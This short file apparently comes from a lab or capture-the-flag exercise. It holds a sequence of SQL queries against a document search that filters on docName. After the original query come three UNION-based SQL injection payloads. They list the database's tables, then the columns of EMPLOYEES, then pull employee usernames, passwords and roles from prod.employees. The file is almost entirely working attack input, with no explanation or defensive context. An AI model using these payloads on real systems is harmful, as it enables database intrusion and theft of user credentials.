select ?, ?, ?, ? from ? where docName like '%week3%'

select ?, ?, ?, ? from ? where docName like '%week5' union (select 1, TABLE_NAME, TABLE_SCHEMA, 1 from INFORMATION_SCHEMA.TABLES);--%';

select ?, ?, ?, ? from ? where docName like '%week5' union (select 1, COLUMN_NAME, 1, 1 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='EMPLOYEES');--%';

select ?, ?, ?, ? from ? where docName like '%week5' union (select emp_id, emp_username, emp_password, emp_role from prod.employees);--%';